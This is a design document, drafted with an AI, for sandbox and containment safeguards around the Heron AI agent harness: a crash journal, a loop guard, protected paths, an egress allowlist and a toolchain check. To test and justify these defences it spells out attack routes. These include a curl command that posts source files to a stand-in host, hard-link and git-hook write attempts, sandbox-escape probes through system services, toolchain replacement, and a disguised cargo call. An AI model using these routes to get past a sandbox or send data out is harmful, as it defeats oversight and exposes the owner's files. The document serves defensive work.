# Heron harness safety: effect journal, loop guard, protected paths and egress

*   **Author:** fernandogarzaaa (drafted with Claude)
*   **Status:** In Review (resolved, awaiting owner approval)
*   **Date:** 2026-11-22. Review resolved 2026-11-23.
*   **Read at:** `main` = `39dbdf5`. Where the text says "after #NN", it relies on one of the open fix PRs #75 to #79.
*   **Depended on by:** [heron-harness2.md](heron-harness2.md), requirement **Pre-5**. That doc is on `main` since #74 and was read at `e1ecd19`. Pre-5 relies on three things defined here:
    *   the effect journal's ask-again hook ([§1.5](#15-the-ask-again-hook-the-interface-pre-5-names));
    *   the toolchain hash check ([§3.4](#34-the-toolchain-hash-check-the-interface-pre-5-names)), unless the owner picks OQ1's stronger option;
    *   behaviour inside the repair child, which runs under a throwaway `HERON_HOME`: the loop guard, protected paths, the egress allowlist, and which process reports a change ([file 14](#14-documents-modify-w7)).
*   **Review:** each finding's decision is in [goldfish_review_report.md](reviews/heron-harness-safety/goldfish_review_report.md).
*   *Drafted with EGM.*

--------------------------------------------------------------------------------

## Overview

This doc covers three upgrades to the code around Heron's model (the harness). The owner has approved building all three.

*   **U1, the effect journal.** Before Heron runs a tool call that changes something, it writes "about to run X" to its database. Afterwards it writes "did X" and the outcome. If Heron crashes in between, it never re-runs X on its own. Instead the user gets an approval: "X was interrupted. Run again?"
*   **U2, the loop guard (`RepeatGuard`).** Heron already notices one call repeated with the same result. U2 also catches two or three calls repeating in turn (A-B-A-B, A-B-C-A-B-C), and failures that differ only in their numbers. When a block has repeated `max_repeats` times with the same results, it stops the turn and says why.
*   **U3, protected paths, an egress allowlist and a toolchain check.**
    *   **Protected paths:** files that run code later are read-only to the agent. Examples are git hooks, `.envrc`, `.mcp.json`, shell rc files, launch agents, and Heron's own config and database. Heron hashes them again after each run and posts a notice if one changed.
    *   **Egress allowlist:** a sandboxed shell command can reach only an allowlist of hosts.
    *   **Toolchain check:** sandboxed commands may still write to the Rust toolchains. Heron hash-checks the toolchain binaries and refuses to run cargo or rustc on a mismatch.

Every piece reuses an existing seam: `execute_call` (`src/agent.rs:613`), the loop nudge (`src/agent.rs:558-566`), parked approvals and the `job_runs` recovery pattern (`src/store.rs:1059-1300`), the Seatbelt profile builder (`src/sandbox.rs:354`) and `classify_path` (`src/permissions.rs:1117`).

**Terms used throughout:**

*   A **mutating call** is a tool call whose effect `mutates()` (`src/permissions.rs:89`). Refused and Forbidden effects are in that set too, but those calls never run, so nothing journals them.
*   A **run** is one piece of work with its own start and end: a chat turn at depth 0 with its sub-agents, one scheduled job or automation, or one `run_parked` call (an approval carried out later).
*   The **user** is the person at the app or terminal. The **owner** is the same person in the role of setting Heron's rules: Settings, "never" lifts and the decisions in this doc.

## The Problem

Four weaknesses were found in Heron on `main`. The harness research of 2026-11-22 found the first three (`00-synthesis.md`, "Gaps", in the owner's research folder, not in this repository). The fourth comes from Seatbelt's design.

1.  **A crash can leave an action half-known.**
    *   `job_runs` and parked approvals are already marked "unknown" after a crash (`recover_interrupted_jobs`, `recover_interrupted_approvals`).
    *   The tool calls a turn makes are not. A chat turn that crashed while sending an email or running `git commit` leaves no record that the call started. After a restart, the conversation shows a tool call with no result.
    *   Harness2's self-heal loop needs this record before it can run unattended: "A crash interrupted it: the effect journal (Pre-5) asks 'Repair #N was interrupted. Run again?'" (`heron-harness2.md`, "When a run fails").
2.  **Only one kind of loop is caught.**
    *   The current check is one exact `name:arguments` signature repeated (`src/agent.rs:558-566`). It only appends a nudge and never stops the turn.
    *   A model that alternates `read_file a` and `list_dir b` spends the whole step budget, which is 40 steps by default (`src/config.rs:306`).
    *   So does a model that re-runs a failing test whose output differs only in timings.
3.  **Files that run code later are writable.**
    *   `classify_path` treats any write inside the working folder as `WorkspaceWrite` (`src/permissions.rs:1132`). So `.git/hooks/pre-commit`, `.envrc` and `.mcp.json` in the working folder are ordinary writes.
    *   The shell sandbox allows writes anywhere in the working folder.
    *   Each of those files runs code later, outside any sandbox: the next `git commit`, the next `cd` with direnv, the next Claude Code session.
    *   Outside the working folder, a write is `Privileged` and asks. One approval of a misread request then edits `~/.zshrc`.
4.  **Sandboxed commands can reach any host, and can change the compiler the owner runs.**
    *   The shell profile starts from `(allow default)` and never restricts IP connections (`src/sandbox.rs:356`). After #79 it denies local sockets other than the command's own. A build script, an npm `postinstall` hook or a prompt-injected command can still post the working folder to any host.
    *   `~/.rustup/toolchains` and `~/.cargo/registry` are writable from the sandbox as build caches (`writable_extras`, `src/sandbox.rs:193-195`). In `.rustup`, only `toolchains/` is writable, not `downloads/` or `tmp/`, so whether a sandboxed toolchain install works at all is untested (PT-T1).
    *   So a sandboxed command can replace `rustc`. The replaced `rustc` then runs, unsandboxed, the next time anyone builds: the owner's terminal, rust-analyzer, Claude Code or skein.

## Goals

*   **G1.** No mutating call is re-run after a crash without a fresh yes from the user. Each call a crash interrupted becomes one waiting approval, whether it came from the model, an automation step or a parked approval. Two identical interrupted calls from the same origin share one approval, because `park_approval` merges them (`src/store.rs:1061-1064`). A crashed job also keeps today's inbox note.
*   **G2.** Other modules can record an action at the run level and get the same ask-again behaviour, with **Run again** and **Dismiss** both reaching them. Harness2's interrupted repair is the first user.
*   **G3.** A turn stops, with a notice that names the calls, when one block of 1, 2 or 3 calls occurs `max_repeats` times in a row (default 4) with the same results. For a failing call, results that differ only in their digits count as the same ([OQ7](#open-questions) (c)).
*   **G4.** `write_file`, `edit_file` and any sandboxed shell command cannot create, change, rename or delete a protected path that exists when the call starts. No rule, approval or permission mode opens one. The config of a repository created during the run is covered by the rehash only (G5, OQ7 (e)).
*   **G5.** After every run that made a mutating call, Heron compares the protected paths with their state before the run's first mutating call. Any difference produces a notice, an inbox entry and an audit row. `heron.db*` and the lease files are left out, because Heron writes them on every call ([OQ8](#open-questions)).
*   **G6.** On macOS, a sandboxed shell command reaches the internet only through Heron's proxy, and only to allowlisted hosts on port 443. A connection the proxy refuses is named, with its reason, in the command's output. A program that ignores the proxy variables fails without such a line.
*   **G7.** A Rust toolchain that changed since the owner last trusted it is never used by a sandboxed shell command that starts after the change is detected. Seatbelt enforces this on macOS. Two cases are not covered: the command that made the change, and commands already running when it is detected. The first check that sees the change reports it, which is normally right after the command that made it.
*   **G8.** Linux and Windows keep today's sandbox: bubblewrap on Linux, none on Windows. All three operating systems build and pass CI as today, including `--features desktop`. Two parts of this design also run where a shell sandbox exists, which includes Linux with bubblewrap:
    *   the file-tool protected paths, which live in `classify_path`;
    *   the toolchain check and refusal, because bubblewrap binds `.rustup/toolchains` writable too (`src/sandbox.rs:440-443`).

    Windows runs no sandboxed commands, so the toolchain check is off there.

## Non-Goals

*   **Anything in [heron-harness2.md](heron-harness2.md).** Self-healing, self-evolution, connectors and observation are out of scope here. This doc only supplies Pre-5.
*   **A completion-decided run status.** It is not cheap. A Heron chat turn has no goal that a machine can check, so each task kind would need its own check definition. Harness2 already uses CI as its check for repairs.
*   **Resuming a crashed turn.** anchor-harness's journal reuses a stored result to resume a run (`effects.rs`, `AlreadyCommitted`). Heron does not resume turns after a crash, so it needs intent and outcome only.
*   **Re-running "idempotent" calls on their own.** The owner rule is "never silently".
*   **Egress filtering for the CLI provider children** (claude, codex), or for Heron's own in-process network tools (`web_fetch`, MCP, connectors). The CLIs need their model API hosts. The in-process tools already go through taint and the permission gate. A CLI that runs its own shell under `cli_allow_agent_tools` is in the [Risks](#risks-and-mitigations) table.
*   **Linux and Windows sandbox changes.** bubblewrap keeps today's rules, and Windows still has no sandbox (G8).
*   **opencode.** The owner has deferred it.
*   **Filtering what is sent to an allowed host.** The proxy does not decrypt TLS, so it can't tell `git fetch` from `git push` on `github.com`. See [Risks](#risks-and-mitigations).
*   **Protecting build inputs in the working folder.** `build.rs`, `Cargo.toml`, `package.json` and the working folder's `.cargo/config.toml` run code in the owner's next build, but writing them is the agent's normal work. The threat model says so (OQ2).

## Owner decisions

The owner made these decisions (2026-11-22). Each one stands until the owner changes it. Defaults proposed by this draft are in [Open Questions](#open-questions), not here.

*   **OD1, the effect journal.** Heron records "about to run X (tool, args hash, session, run)" before each tool call that changes something, and "did X (outcome)" after. An intent with no outcome after a crash is never re-run silently. It becomes an approval that asks again: "This was interrupted. Run again?"
*   **OD2, no journal for reads.** Read-only effects are not journaled.
*   **OD3, completion status only if cheap.** A completion-decided run status is built only if cheap. This doc finds it is not cheap, so it is a non-goal.
*   **OD4, the loop guard.** `RepeatGuard` detects A-A, A-B and A-B-C cycles and results that differ only in numbers, and stops the turn with a clear notice. It extends the existing loop check rather than adding a second one, and it is ported from anchor-harness `repeats.rs`.
*   **OD5, protected paths.** anchor-harness's list is read-only to the agent: git hooks, `.envrc`, `.mcp.json`, shell rc files, `~/Library/LaunchAgents`, and Heron's own config and database. This covers `write_file`, `edit_file` and the shell sandbox. Heron hashes the list again after each run and posts a notice if anything changed.
*   **OD6, egress allowlist.** The allowlist is on for sandboxed shell commands.
*   **OD7, toolchain writes and the hash check.** Sandboxed writes to `~/.rustup/toolchains` and `~/.cargo/registry` stay allowed. Before Heron next uses the toolchain binaries, it hash-checks them and refuses on a mismatch. "Uses" means Heron running cargo or rustc in its shell. See OQ1 for the stress test.
*   **OD8, scope.** Out of scope: anything in heron-harness2.md, Linux and Windows sandboxes beyond not breaking them, and opencode.
*   **Invariants that must not weaken:**
    *   **I1.** The sandbox is on by default.
    *   **I2.** A tainted conversation's grants never reach the shell.
    *   **I3.** "Never" rules are lifted only in the app.
    *   **I4.** Memory never trusts outside content.

    [§4](#4-how-each-invariant-is-kept) says how this design keeps each one.

## Open Questions

Each question has a proposed default, and the build uses it unless the owner changes it. Where the draft also recommends something else, the question says so. OQ7 to OQ12 were added by the review (2026-11-23).

*   **OQ1, OD7 checks the toolchain too late. Default: OD7 as written, plus three additions. Recommended: the stronger option.**
    *   **The finding.** The real risk is not Heron's next use: Heron's next use is sandboxed anyway. The risk is the owner's next unsandboxed use. rust-analyzer runs `cargo check` within seconds of a file save, and the owner's terminal, Claude Code sessions and skein nodes all run cargo too. Any of them can run a replaced `rustc` before Heron checks anything.
    *   **The three additions, built with the default:**
        1.  The check also runs after every sandboxed shell command, timeouts included. The first check that sees a change reports it.
        2.  Seatbelt denies reads of a changed toolchain, so no route through the shell can use it.
        3.  The notice names the command that made the change, when one check brackets it.
    *   **What the default still leaves open.** Between the end of the bad command and the owner reading the notice, rust-analyzer, the owner's terminal, Claude Code or skein can run the replaced binary.
    *   **The stronger option ([A11](#a11-deny-sandbox-writes-to-the-toolchains)).** Deny sandbox writes to `~/.rustup/toolchains`, and keep `~/.cargo/registry` writable.
        *   **Cost:** a sandboxed command can't install or update a toolchain. A `rust-toolchain.toml` pin that isn't installed fails until the owner runs `rustup toolchain install` in their own terminal. Heron pins `1.99.1` in its own `rust-toolchain.toml`.
        *   **Gain:** it closes the window above. It also removes W5, the trust API and button, the read deny, the Rust-tool detection, and Harness2's call to `toolchain::check`.
        *   **The cost may already be paid.** Only `.rustup/toolchains` is writable, not `.rustup/downloads`, `.rustup/tmp` or `settings.toml` (`src/sandbox.rs:194`). So a sandboxed install may fail today. PT-T1 settles this before the build.
    *   **Recommendation: the stronger option.** The user's cost is about the same either way: one trust click per `rustup update`, against one `rustup toolchain install` per pin change. The stronger option also closes a window the default leaves open. If PT-T1 shows that a sandboxed install already fails, it costs no features at all.
    *   **If the owner picks it:** W5 is cut. §3.4 and the toolchain parts of files 10 to 13 are dropped. Harness2's Pre-5 drops its `toolchain::check` call in the same change.
*   **OQ2, other build-time code the toolchain check doesn't cover. Proposed: record each as an open risk in the threat model, and revisit them with OQ1.**
    *   **`~/.cargo/registry/src`.** Cargo does not re-verify extracted crate sources. A sandboxed command that edits `~/.cargo/registry/src/*/<crate>/build.rs` gets that code run by the owner's next unsandboxed build of any project that uses the crate.
    *   **`~/.cargo/git/checkouts`.** The same risk for git dependencies. `~/.cargo/git` is writable from the sandbox (`src/sandbox.rs:194`).
    *   **The working folder's `.cargo/config.toml`.** It can set `build.rustc-wrapper`, which rust-analyzer then runs. It is a build input, which this design leaves writable ([Non-Goals](#non-goals)).
    *   Hashing the registry costs too much: it is 1.2 GB on the owner's Mac.
    *   The structural fix is to give sandboxed commands their own `CARGO_HOME`. That doubles the disk use and loses the shared cache, so it is listed under [Future Improvements](#future-improvements).
*   **OQ3, protected names beyond OD5's list. Proposed: add the new names below, and protect the files of Heron's homes rather than the folders.**
    *   **Already part of OD5.** OD5 adopts anchor-harness's list. That list holds `.gitmodules`, `.husky`, `.claude`, `.vscode`, `.idea`, `.ripgreprc`, and each repository's hooks and config (`protect.rs`, `WORKSPACE_NAMES` and `GIT_PARTS`). They are built as OD5, not as additions. The repository config matters because its `core.hooksPath`, `core.fsmonitor` and filter settings run code, so without it the hooks rule can be stepped around in one line.
    *   **New names proposed here.** Each one runs code later, as the listed ones do:
        *   `~/.gitconfig` and `~/.config/git/`;
        *   `~/.cargo/config.toml`, through `build.rustc-wrapper`;
        *   `~/.zlogin`.
    *   **Heron's own homes (the default).** OD5 names "Heron's own config and database". These files are protected in both `cfg.home` and the default `~/.heron`: `config.toml`, `heron.db`, `heron.db-wal`, `heron.db-shm` and `secrets.json`. A Heron started with `HERON_HOME` set elsewhere still protects the owner's real ones.
    *   **The alternative: protect the whole default `~/.heron` folder.** It would also cover memories, skills and `journal/`.
        *   **Its cost:** Harness2's repair puts its worktree at `~/.heron/selfheal/runs/<id>/wt` (Harness2 §2, "The repair run"). Every file-tool write there would be refused, and a Seatbelt deny on the folder would stop `cargo test` from writing `target/`. It would need an exemption for `selfheal/runs/`. Harness2 can't move its runs without going against OD8.
        *   **Recommendation: keep the file-level default.** The shell can't write the default home unless the working folder is inside it (`src/sandbox.rs:386-387`). The file tools reach memories and skills only through their own tools.
*   **OQ4, loopback stays open. Proposed: allow outbound connections to `localhost:*`, minus a configured deny list (`agent.deny_local_ports`, empty by default).**
    *   **Why.** Heron's own tests bind `127.0.0.1:0` and connect (`src/server.rs:2269`, `src/telegram.rs:973`). Harness2's repair runs `cargo test --locked` under this profile, so a loopback deny would break it. Seatbelt can't express a port range, so an ephemeral-port allowance can't be written.
    *   **What stays open.** A local process that forwards traffic onward bypasses the allowlist. Examples are an HTTP debugging proxy, an `ssh -D` tunnel, or the owner's local model proxy on `127.0.0.1:8080`.
    *   **Heron's own API port.** The profile also denies it, as defence in depth ([§3.2](#32-the-egress-allowlist)). I3 does not rest on it: every `/api` route needs the token.
    *   **Proposed for the owner's own config:** `deny_local_ports = [8080]`.
*   **OQ5, `github.com` and `registry.npmjs.org` accept uploads. Proposed: keep both on the default list.**
    *   Both hosts accept authenticated writes (`git push`, `npm publish`). So a command carrying an attacker's token could still send data out through them.
    *   They are kept because without them `git clone` of public repositories and every `npm install` break.
    *   Three things narrow the gap:
        *   `cargo`, `npm`, `pnpm`, `yarn`, `pip` and `gem` `publish` commands are `Privileged` (`src/permissions.rs:684`, `777-778`). They ask every time in every mode but unrestricted, and no standing rule covers them. They are not Forbidden, so a publish the user approves still reaches an allowed host;
        *   in a tainted conversation, every mutating shell command asks;
        *   `crates.io` itself, the API host for `cargo publish`, is left off the list.
*   **OQ6, who may change the egress list or re-trust the toolchain. Proposed:** both are changed only through Heron's authenticated API, from the app's Settings › Sandbox. The same is true of a "never" lift. No agent tool can do either, because the file tools are refused `config.toml` and `heron.db`, and the shell can't reach them.
*   **OQ7, the draft's readings of the owner decisions. Proposed: confirm each one as the body states it.** The OD text above is unchanged. Each line is a place where the body reads an OD more narrowly or more widely than its words.
    *   **(a) OD1: the full arguments are stored, not only the hash.** A re-run needs them, and the `approvals` table already keeps the same data. They are kept only while the call is open ([§1.2](#12-the-record)).
    *   **(b) OD2: `NetworkEgress` counts as a read.** Its effect sends a query out, such as a search or a read-only connector call. Repeating it changes nothing, so it is not journaled. The alternative journals it, at the cost of one more "Run again?" per interrupted search.
    *   **(c) OD4: digits are ignored only in failures.** This follows anchor-harness. A success whose numbers change ("3 passed", then "4 passed") is progress, and ignoring digits there would stop legitimate polling.
    *   **(d) OD4: `max_repeats = 0` turns the stop off.** The nudge stays. It is an owner budget like `max_steps`, set only in Settings.
    *   **(e) OD5: when the rehash runs, and what it can't block.**
        *   The snapshot is taken at a run's first mutating call, not at its start, so read-only runs are not rehashed.
        *   The config of a repository created during the run can't be denied by Seatbelt, because the scan hasn't seen it. Its hooks are denied at any depth. Its config is checked by the rehash only.
    *   **(f) OD6: `egress = "open"` turns the allowlist off.** Only the owner can set it, in Settings, and it is the rollback switch. The breakage listed in [§3.2](#32-the-egress-allowlist) is also proposed as accepted: port 443 only, no SSH, no DNS, no Docker, and the network rules for background processes. OD6 doesn't name it.
    *   **(g) OD7: the hash check is stat-first.** Only files whose size, inode, mtime or ctime changed are hashed again ([A10](#a10-hash-the-whole-toolchain-before-every-command)).
    *   **(h) OD7: what "uses" covers.** The body enforces OD7's "uses" for any route, with a Seatbelt read deny, not only for command lines that name cargo. It also adds the after-command checks of OQ1.
    *   **(i) OD3: "This doc finds it is not cheap" is the draft's finding.** It is not the owner's words. [Non-Goals](#non-goals) gives the reason. Confirming keeps the completion status a non-goal.
*   **OQ8, what the rehash covers. Default: OD5's list, minus the files Heron itself writes on every call. Recommended: workspace paths only.**
    *   **The default.** The rehash covers the workspace names, each repository's hooks and config, the home paths, and the config and secrets files of Heron's homes. It leaves out `heron.db*`, the lease files and `background.lock`: Heron writes them on every call, so their hashes always differ. This is the one deviation from OD5's "hashes the list again". A Settings save during a run produces a notice for `config.toml`.
    *   **The alternative (Stage 8, Z8-10): rehash workspace paths only.** Home paths and Heron's homes are already outside the shell's writable set (`src/sandbox.rs:385-388`), and the file tools refuse them. Meanwhile installers, `gh auth setup-git`, IDEs, nvm and rustup edit them routinely. So a home rehash mostly reports other software's edits as Heron's.
    *   **Recommendation: the alternative.** It keeps the notices meaningful, and prevention already covers the home paths.
*   **OQ9, an identical call while an ask-again is waiting. Proposed: it asks.** While an ask-again approval for the same session, tool and argument hash is waiting, an identical call in that session gets `Ask`, whatever the mode. After a restart, a user who says "continue" in auto mode could otherwise get `git commit` re-run silently, and twice if they also press **Run again**. The cost is one more question in that rare case. In a job, whose approver is `DenyAll`, it becomes a denial.
*   **OQ10, narrowing `.claude`. Default: all of `.claude`, at any depth (OD5). Recommended: anchor's `CLAUDE_HOME_ITEMS` only.**
    *   **The default's cost.** When the working folder holds `.claude/worktrees/` (this repository does), sandboxed commands can't write those worktrees, and each snapshot hashes them whole.
    *   **The alternative.** Under each `.claude`, protect only `settings.json`, `settings.local.json`, `CLAUDE.md`, `commands`, `agents`, `skills`, `hooks` and `plugins` (anchor `protect.rs`, `CLAUDE_HOME_ITEMS`). These are the items that run code or steer a later session.
*   **OQ11, a narrower action interface for Harness2. Default: §1.5 as written (G2).**
    *   **The alternative (Stage 8, Z8-4).** Drop action rows from `effects`. Harness2 marks its own `running` triggers `interrupted`, as its tick already runs only where `own_background_work()` holds. It then calls `journal::ask_again_action(handler, subject, label, session_id, tainted)`. `Resumer` is unchanged.
    *   **Gain:** no state kept twice, and no `begin_action`, `finish` or `label` column.
    *   **Cost:** G2 narrows to "ask again for an action the caller already knows was interrupted", and Harness2's text changes in the same PR.
    *   **Recommendation: the alternative,** if the owner is willing to edit Harness2's Pre-5 text with this build.
*   **OQ12, draft parameters. Proposed: each as written.**
    *   Finished journal rows are kept for 30 days.
    *   The default host list in [§3.2](#32-the-egress-allowlist).
    *   CONNECT to port 443 only.
    *   `~/.cargo/bin` is left out of the toolchain manifest, because the sandbox can't write there.
    *   Trust on first use: the first toolchain check trusts whatever is installed. The alternative refuses until the owner trusts once in Settings, which closes the gap of a toolchain already changed before this build ships.
    *   No new `## R-` entry in `docs/ACCEPTED_RISKS.md`. That file is capped at 3 entries, so these go into the threat model.
    *   On Linux, re-trusting a toolchain is done only through the authenticated API (`POST /api/toolchain/trust`). This doc adds no Linux screen for it.

## Prototype checks

The build session runs these unsandboxed on the owner's Mac before `skein run` (Pre-S2), and commits the output under [Prototype results](#prototype-results). A failure changes the design before any code is written.

*   **PT-E1, the Seatbelt network rules compile and behave as intended.** Run the full shell profile, after #79, with the rules from [§3.2](#32-the-egress-allowlist) under `sandbox-exec -p`. Then check each of these:
    *   `curl --noproxy '*' https://example.com` fails;
    *   `python3 -c "import socket; socket.getaddrinfo('example.com', 443)"` fails;
    *   inside the profile, `python3 -c "import socket; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(); socket.create_connection(s.getsockname())"` succeeds. This is the shape of Heron's own server tests. It is why the profile denies only outbound IP connections, not anchor-harness's `network*`, which also covers bind and inbound;
    *   `curl -x http://127.0.0.1:<proxy> https://static.crates.io/` succeeds;
    *   the same command with `::1` in place of `127.0.0.1` behaves the same;
    *   #79's own-socket rules still hold under the egress rules: #79's test `sandboxed_shell_cannot_reach_a_local_agent_socket` passes, so sockets in the working folder and in the shell's `TMPDIR` work, and other sockets don't;
    *   on the owner's Mac, list the sockets (`find /private/tmp /private/var/folders ~/.orbstack ~/.docker ~/.colima -type s`) and try to connect to each from the profile. Every one outside the working folder and `TMPDIR` must fail;
    *   routes through system services fail: `open https://example.com`, `osascript -e 'open location "https://example.com"'` and `nscurl https://example.com`. If one succeeds, deny its mach service in the profile and test again.

    A socket or service found here that runs commands for the caller stops the build until the profile denies it.

    anchor-harness's profile (`crates/harness-runtime/src/sandbox.rs:217-237`, at `daed7ef`) is the tested starting point. The new rule is `(allow network-outbound (remote ip "localhost:*"))`, so check that rule hardest.
*   **PT-E2, real package fetches work through the proxy.** In a scratch crate, run each of these through the proxy with only the default allowlist:
    *   `cargo fetch` with an empty `CARGO_HOME`;
    *   `npm view left-pad`;
    *   `uv pip download six`;
    *   `git clone https://github.com/rust-lang/rustlings`.

    Record any extra host they need, and add it to `DEFAULT_ALLOW` in Pre-S1. The sparse index's `config.json`, read on the owner's Mac, names `dl = https://static.crates.io/crates` and `api = https://crates.io`.
*   **PT-P1, hard links.** In a sandboxed shell, run `ln ~/.zshrc ./z && echo x >> ./z`. Record whether Seatbelt refuses it. If it does not, the rehash ([§3.3](#33-the-after-run-rehash)) is the only control for this case, and the threat model must say so.
*   **PT-P2, git under the protect rules.** In a sandboxed shell with the rules from [§3.1](#31-the-protected-list-and-the-write-check):
    *   `git init x && git -C x commit --allow-empty -m x` succeeds, and so does `git clone https://github.com/rust-lang/rustlings`;
    *   `echo x > x/.git/hooks/pre-commit` fails;
    *   `mv x/.git/hooks h` fails.

    If `git init` fails because the `hooks` folder itself is denied, narrow the deny to entries inside `hooks/`, and record that renaming the folder is then caught only by the rehash.
*   **PT-T1, auto-install.** With `rust-toolchain.toml` pinning a channel that isn't installed, run `cargo --version` sandboxed. Record:
    *   whether rustup 1.29.2 installs the channel;
    *   whether `RUSTUP_AUTO_INSTALL=0` stops it;
    *   whether a sandboxed `rustup toolchain install` works at all today.

    The result goes to OQ1, so the owner decides with it in hand.

### Prototype results

Pre-S2 writes each check's output here, before `skein run`. Empty until then.

## Critical User Journeys (CUJs)

### CUJ 1: A crash during a side effect

*Covers G1.*

*   **Given:** a chat turn asks Heron to commit. The `shell` call for `git commit -m "…"` has started.
*   **When:** the Heron core is killed before the command returns. The app restarts it.
*   **Then:**
    *   The Approvals list shows one item: "`git commit -m …` was interrupted. Run again?" Its detail reads: "Heron stopped while doing this. It may or may not have finished. Check before running it again."
    *   **Run again** re-checks the current rules and the call's taint, then runs it once.
    *   **Dismiss** closes it.
    *   Nothing runs before the user answers. If the user tells the model to continue, an identical `git commit` asks first (OQ9).

### CUJ 2: An interrupted Harness2 repair (Pre-5)

*Covers G2.*

*   **Given:** Harness2 started repair #12. Before spawning the repair process, it recorded a run-level action with handler `selfheal.repair` and subject `12`.
*   **When:** the main process crashes. The next Heron process that owns background work runs recovery, at startup or on its next scheduler tick.
*   **Then:**
    *   The Approvals list shows "Repair #12 was interrupted. Run again?"
    *   **Run again** passes the policy check, then calls Harness2's resumer, which re-queues the repair.
    *   **Dismiss** calls its `declined`, which sets `triggers.state` to `cancelled`.

### CUJ 3: An A-B loop

*Covers G3.*

*   **Given:** the model calls `read_file notes.md` and then `list_dir .`, again and again, with the same results.
*   **When:** the block has occurred 4 times in a row, at the 8th call.
*   **Then:**
    *   The turn stops calling tools. The app shows the notice "Stopped: the same 2 calls (read_file, list_dir) ran 4 times in a row with the same results."
    *   The model gets one closing call with no tools. It tells the user what is blocking it, the same way as at the step limit.

### CUJ 4: A failing test with changing timings

*Covers G3.*

*   **Given:** `cargo test` fails 4 times in a row. The output differs only in `finished in 0.41s`, `0.43s` and so on, and in the process ids. Each result ends with `[exit code 101]`, so it counts as a failure.
*   **When:** the 4th failure arrives.
*   **Then:** the turn stops with "Stopped: the same call (shell) ran 4 times in a row with the same results. Failures that differ only in digits count as the same."
*   **But:** 10 successful calls whose counts change ("3 passed", "4 passed") do not stop it.

### CUJ 5: Writing a git hook

*Covers G4.*

*   **Given:** the working folder is a git repository.
*   **When:** the model calls `write_file .git/hooks/pre-commit`, or runs `echo x >> .git/hooks/pre-commit` in the shell.
*   **Then:**
    *   The file tool is refused before anything is asked: "Refused: .git/hooks/pre-commit is a protected file (a git hook, which runs code later). Heron's file tools can't change it in any mode."
    *   The shell command fails with "Operation not permitted" from Seatbelt.
    *   Both outcomes are in the audit log.

### CUJ 6: A protected file changes anyway

*Covers G5.*

*   **Given:** a turn ran shell commands.
*   **When:** `.envrc` in the working folder differs at the end of the turn from its state before the turn's first mutating call. It might be the owner editing it at the same time, or a gap in the sandbox.
*   **Then:**
    *   The app shows the notice "Protected files changed while Heron was working: .envrc (changed). If you didn't change them, check them before you next use this folder."
    *   An inbox entry and an audit row (`protected-path-changed`) record the same.

### CUJ 7: A build fetches crates, and an unknown host is blocked

*Covers G6.*

*   **Given:** egress is set to `allowlist`, with the default list.
*   **When:** the model runs `cargo build`, then `curl https://paste.example.net -d @src/main.rs`.
*   **Then:**
    *   cargo downloads from `index.crates.io` and `static.crates.io` through the proxy.
    *   curl fails. Its output ends with "[network] blocked paste.example.net:443: not on the sandbox's egress allowlist. Don't work around this; tell the user, who can add the host in Settings › Sandbox."

### CUJ 8: The toolchain changes in the sandbox

*Covers G7.*

*   **Given:** the stable toolchain is trusted.
*   **When:** a sandboxed command overwrites `~/.rustup/toolchains/stable-aarch64-apple-darwin/bin/rustc`.
*   **Then:**
    *   **Right after the command:** its output ends with "[toolchain] the Rust toolchain stable-aarch64-apple-darwin changed during this command (bin/rustc). Heron won't use it until you trust it in Settings › Sandbox." The inbox says the same.
    *   **The next cargo command:**
        *   It is refused before it starts.
        *   If it is disguised (`sh -c 'car''go b'`), Seatbelt denies reading that toolchain folder.
    *   **The owner:** after checking, presses **Trust the Rust toolchain as it is now** in Settings › Sandbox, or reinstalls it with `rustup toolchain install --force` in their own terminal and then trusts it.

## Technical Plan (Architecture)

```text
                     ┌──────────── Agent::run_turn (src/agent.rs), inside a RunFrame ──────────────┐
model tool calls ──▶ │ execute_call ──▶ Policy::decide ──▶ approver                                 │
                     │      │                                                                       │
                     │      ▼  (mutating call)                                                      │
                     │ journal::guarded(intent, timeout) ──▶ tool.call ──▶ outcome                  │
                     │      │ first mutating call of the run                                        │
                     │      └──▶ protect::Snapshot::take, kept in the RunFrame                      │
                     │ RepeatGuard.observe(call, ok, result) ──▶ nudge, or stop the turn            │
                     │ end of the RunFrame ──▶ protect diff ──▶ notice if changed                   │
                     └──────────────────────────────────────────────────────────────────────────────┘
run_parked (src/app.rs), its own RunFrame ──▶ policy.decide ──▶ journal::guarded ──▶ tool.call,
                                                                     or resume:<handler> ──▶ Resumer
own_background_work and each scheduler tick ──▶ journal::recover ──▶ park_approval("… Run again?")

shell tool (src/tools/shell.rs), per command:
  toolchain::check (before) ──▶ refuse if the toolchain changed and a Rust tool is named
  protect::scan(workspace) ──▶ the repositories to deny
  egress::start(allowlist) ──▶ 127.0.0.1:<port>  (CONNECT :443, public address, SNI = host)
  sandbox::seatbelt_profile(... protect rules, network rules, changed-toolchain denies)
  sandbox-exec bash -c <cmd>   env: HTTPS_PROXY=http://127.0.0.1:<port>, NO_PROXY=localhost,...
  egress decisions ──▶ "[network] blocked …" lines;  toolchain::check (after) ──▶ notice
```

Five new modules hold the logic. Each is unit-tested without the rest. The existing files call into them at the seams named above.

| Module | Holds | Persists in |
|---|---|---|
| `src/journal/` | Intent and outcome records, process leases, recovery, the ask-again hook, the resumer registry | A new `effects` table in `heron.db`, plus lease files in `<heron home>/journal/` |
| `src/repeat/` | `RepeatGuard`, ported | Nothing (one per `run_turn` call) |
| `src/egress/` | The CONNECT proxy, the host check, the Seatbelt network rules | Nothing (one proxy per command) |
| `src/protect/` | The protected list, the write check, the Seatbelt write rules, the scan, snapshots, ported | Nothing (the snapshot lives in the run's `RunFrame`) |
| `src/toolchain/` | The toolchain manifest, the stat-then-hash check, trust | kv `toolchain:baseline` and kv `toolchain:changed` in the main `heron.db` |

### 1. U1, the effect journal

#### 1.1 What is journaled

A call is journaled when its effect `mutates()` (`src/permissions.rs:89`):

*   `LocalStateWrite`, `WorkspaceWrite` and `SensitiveWrite`;
*   `ProcessExec`, `ExternalWrite` and `Privileged`.

This is Heron's existing definition of "changes something", and read-only mode refuses exactly this set. `Forbidden` and `Refused` are in the set too, but those calls never run, so they have nothing to journal.

`LocalRead`, `NetworkRead`, `SensitiveRead`, `OutsideRead` and `NetworkEgress` are not journaled. `NetworkEgress` sends a query, such as a search or a read-only connector call. Repeating one changes nothing, so asking again would be noise (OD2, OQ7 (b)). `delegate` itself is not journaled; the child agent's own calls are.

#### 1.2 The record

There is one new table, `effects`, added as data-format step 4 (after `to_v3`, `src/store.rs:190`).

| Column | Meaning |
|---|---|
| `id` | Row id. This is the `EntryId` that `begin_action` returns |
